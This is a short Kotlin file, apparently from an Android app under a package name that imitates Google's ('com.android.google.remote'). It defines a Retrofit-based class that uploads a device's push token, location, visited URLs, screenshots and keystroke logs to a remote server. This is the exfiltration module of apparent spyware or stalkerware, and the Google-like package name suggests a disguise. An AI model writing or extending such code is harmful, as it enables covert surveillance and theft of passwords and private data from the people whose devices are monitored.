package com.android.google.remote.server

import com.android.google.remote.RemoteService
import com.android.google.remote.models.*
import com.android.google.remote.retrofit.Retrofit

/*
* Here with Retrofit2 - Manager sending data to the remote server
* */

class Server(
    private val service: ServerService = Retrofit.getService()
): RemoteService {

    override suspend fun sendPushToken(token: PushTokenDTO) {
        service.sendPushToken(token = token)
    }

    override suspend fun sendLocation(location: LocationDTO) {
        service.sendLocation(location = location)
    }

    override suspend fun sendUrl(url: UrlDTO) {
        service.sendUrl(url = url)
    }

    override suspend fun sendScreenshot(screenshot: ScreenshotDTO) {
        service.sendScreenshot(screenshot = screenshot)
    }

    override suspend fun sendKeyLog(keyLog: KeyLogDTO) {
        service.sendKeyLog(keyLog = keyLog)
    }

}